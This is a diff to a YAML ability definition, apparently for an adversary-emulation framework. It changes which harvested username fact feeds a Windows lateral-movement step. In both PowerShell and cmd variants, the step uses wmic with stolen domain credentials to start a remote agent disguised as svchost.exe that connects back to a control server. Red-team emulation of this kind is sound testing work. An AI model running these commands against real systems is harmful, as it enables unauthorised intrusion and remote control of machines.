@@ -11,12 +11,12 @@
     windows:
       psh:
         command: |
-          wmic /node:#{remote.host.ip} /user:#{comp.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\Users\Public\svchost.exe -server #{server} -executors psh";
+          wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "powershell.exe C:\Users\Public\svchost.exe -server #{server} -executors psh";
       cmd:
         command: |
-          wmic /node:#{remote.host.ip} /user:#{comp.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\Users\Public\svchost.exe -server #{server} -executors cmd";
+          wmic /node:#{remote.host.ip} /user:#{domain.user.name} /password:#{domain.user.password} process call create "cmd.exe /c C:\Users\Public\svchost.exe -server #{server} -executors cmd";
   requirements:
     plugins.stockpile.app.requirements.basic:
-      - source: comp.user.name
+      - source: domain.user.name
         edge: has_password
         target: domain.user.password
